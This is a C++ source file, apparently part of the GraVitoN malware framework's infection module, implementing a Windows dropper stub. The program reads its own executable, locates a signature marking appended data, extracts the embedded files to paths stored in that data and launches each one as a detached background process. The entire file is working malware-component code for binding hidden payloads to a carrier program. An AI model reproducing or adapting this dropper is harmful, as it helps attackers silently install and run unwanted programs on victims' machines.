// #define WINDOWS
// #define LINUX
// #define MACOSX

/// Activate/Deactivate GraVitoN logger
#define GVN_ACTIVATE_LOGGER

#include <windows.h>
#include <utils/files.hpp>
#include <infect/generic/endoffile.hpp>
#include <sys/types.h>
#include <unistd.h>
#include <iostream>
#include <cassert>
#include <vector>

using namespace std;
using namespace GraVitoN::Utils;
using namespace GraVitoN::Infect;

typedef unsigned long UInt64;

UInt64 getSignaturePos(const char unsigned *buff, const UInt64 &size)
{
    size_t spos = 0, i = 0;
    for(i=0; i<size; ++i)
    {
        if( buff[i] == EndOfFile::ENDOFFILE_EOF_SIGNATURE[spos] )
        {
            ++spos;
            //Logger::logItLn(spos);
            if( spos == EndOfFile::ENDOFFILE_EOF_SIGNATURE_SIZE )
            {
                //Logger::logItLn(i);
                return i - EndOfFile::ENDOFFILE_EOF_SIGNATURE_SIZE;
            }
        }
        else
        {
            spos = 0;
        }
    }

    return size;
}

void runDetachedProcess(const string &exe_path)
{
	/// Run It
	//system("start notepad.exe");
	STARTUPINFO si; 
	ZeroMemory( &si, sizeof(si) ); 
	si.cb = sizeof(si); 
	PROCESS_INFORMATION pi; 
	ZeroMemory( &pi, sizeof(pi) ); 
	BOOL result = CreateProcess
	( 
		exe_path.c_str(),	// No module name (use command line) 
		NULL,				// Command line 
		NULL,				// Process handle not inheritable 
		NULL,				// Thread handle not inheritable 
		FALSE,				// Set bInheritHandles to FALSE 
		DETACHED_PROCESS,	// Detach process 
		NULL,				// Use parent's environment block 
		NULL,				// Use parent's starting directory 
		&si,				// Pointer to STARTUPINFO structure 
		&pi					// Pointer to PROCESS_INFORMATION structure (returned) 
	);
}

int WINAPI WinMain (HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR cmd_line, int n_cmd)
{
	generateSignature();

	unsigned char *buff = NULL;
	UInt64 buff_size, spos;
	
	char myExeName[MAX_PATH];
	GetModuleFileName(h_instance, myExeName, MAX_PATH);
	buff_size = File::loadFile(myExeName, &buff);
	//buff_size = File::loadFile("payload.exe", &buff);
	
    spos = getSignaturePos(buff, buff_size) + EndOfFile::ENDOFFILE_EOF_SIGNATURE_SIZE + 1;
	//printf("%lu < %lu\n", spos, buff_size);
	assert(spos < buff_size);
	
	int number_of_files = 0;
	memcpy(&number_of_files, &buff[spos], 2);
	spos += 2;
	assert(spos < buff_size);
	
	//printf("Num: %d\n", number_of_files);
		
	vector<string> full_path;
	vector<bool>   is_executable;

	int i;
	for(i=0; i<number_of_files; ++i)
	{
		char *filename;
		char *extraction_path;
		unsigned char *file_contents;
	
		int file_size = 0;
		unsigned long filename_size = 0;
		int extraction_path_size = 0;
	

		UInt64 sz = 0;
		/// Read size of file name: 2 bytes
		filename_size = 0;
		memcpy(&filename_size, &buff[spos], 2);
		spos += 2;
		assert(spos < buff_size);
		filename = new char [filename_size + 1];
		//printf("NSize: %d, spos: %lu\n", filename_size, spos);
		
		/// Read filename
		sz = filename_size * sizeof(char);
		memcpy(filename, &buff[spos], sz);
		filename[filename_size] = '\0';
		//printf("Name: '%s'\n", filename);
		spos += sz; 
		assert(spos < buff_size);
		
		/// Read size of extraction path: 2 bytes
		extraction_path_size = 0;
		memcpy(&extraction_path_size, &buff[spos], 2);
		spos += 2; 
		assert(spos < buff_size);
		extraction_path = new char [extraction_path_size + 1];
		//printf("XSize: %d, spos: %lu\n", extraction_path_size, spos);
		
		/// Read extraction path
		sz = extraction_path_size * sizeof(char);
		memcpy(extraction_path, &buff[spos], sz);
		extraction_path[extraction_path_size] = '\0';
		//printf("Extp: '%s'\n", extraction_path);
		spos += sz; 
		assert(spos < buff_size);
		
		/// Execute after extraction (Flag): 1 byte
		sz = 1;
		int isExec = 0;
		memcpy(&isExec, &buff[spos], sz);
		is_executable.push_back( (isExec)?true:false );
		spos += sz; 
		assert(spos < buff_size);
		
		/// Read Size of File: 4 bytes
		file_size = 0;
		memcpy(&file_size, &buff[spos], 4); 
		spos += 4; 
		assert(spos < buff_size);
		//printf("FSize: %lu, spos: %lu\n", file_size, spos);
		
		/// Read file content
		sz = file_size * sizeof(unsigned char);
		//printf("Loading file (%lu) ...\n", sz);
		file_contents = new unsigned char[file_size];
		memcpy(file_contents, &buff[spos], sz);
		spos += sz;
		assert(spos <= buff_size);
		
		/// Extract file
		full_path.push_back(extraction_path);
		full_path[i] = full_path[i] + string(filename);
		File::saveUChars(full_path[i], file_contents, file_size);

		/// Free memory
		delete file_contents;
		delete filename;
		delete extraction_path;
	}
	
	for(vector<string>::iterator ivs = full_path.begin(); ivs != full_path.end(); ++ivs)
		runDetachedProcess(*ivs);

	return 0;
}
